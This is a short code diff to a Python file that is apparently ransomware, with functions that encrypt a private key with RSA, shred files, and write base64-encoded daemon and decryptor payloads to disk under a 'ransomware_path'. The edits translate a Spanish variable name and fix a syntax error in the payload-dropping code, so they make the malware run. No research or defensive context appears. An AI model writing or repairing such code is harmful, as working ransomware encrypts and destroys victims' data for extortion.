@@ -36,11 +36,11 @@ def encrypt_priv_key(msg, key):
 
     key = RSA.importKey(key)
     cipher = PKCS1_OAEP.new(key)
-    cifrado = []
+    encrypted = []
     for i in x:
         ciphertext = cipher.encrypt(i)
-        cifrado.append(ciphertext)
-    return cifrado
+        encrypted.append(ciphertext)
+    return encrypted
 
 
 def shred(file_name,  passes=1):
@@ -169,7 +169,7 @@ def drop_daemon_and_decryptor():
     with open(variables.decryptor_path,'wb') as f:
         f.write(base64.b64decode(variables.decryptor))
 
-    with open(variables.daemon_path), 'wb') as f:
+    with open(variables.daemon_path, 'wb') as f:
         f.write(base64.b64decode(variables.daemon))
 
     os.chdir(variables.ransomware_path)
